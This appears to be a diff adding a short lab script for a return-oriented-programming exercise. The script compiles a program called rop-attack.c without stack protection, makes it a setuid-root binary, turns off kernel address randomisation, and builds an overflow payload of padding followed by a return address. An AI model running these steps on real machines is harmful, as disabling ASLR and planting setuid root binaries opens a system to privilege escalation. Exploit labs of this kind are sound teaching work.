@@ -1,0 +1,5 @@
+gcc -fno-stack-protector -z noexecstack -m32 -g rop-attack.c -o my-sudo
+sudo chown root:root my-sudo
+sudo chmod a+s my-sudo
+sudo sysctl kernel.randomize_va_space=0
+$(python2 -c 'print ("a" * 28 + "\x78\x62\x55\x56")')
